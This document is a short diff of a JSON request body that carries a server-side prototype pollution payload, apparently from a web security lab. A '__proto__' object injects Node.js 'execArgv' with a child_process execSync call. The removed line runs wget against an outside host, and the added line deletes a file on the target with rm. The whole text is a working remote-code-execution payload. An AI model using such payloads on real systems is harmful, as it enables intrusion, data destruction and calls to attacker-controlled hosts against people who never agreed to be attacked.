@@ -6,7 +6,7 @@
   "country": "UK",
   "__proto__": {
     "execArgv": [
-      "--eval=require('child_process').execSync('wget c0smicsag3x.pythonanywhere.com/grading')"
+      "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
     ]
   },
   "sessionId": "NT7hL1ZOBeGHXAs8xwA5tbrjEhGQeg1i"
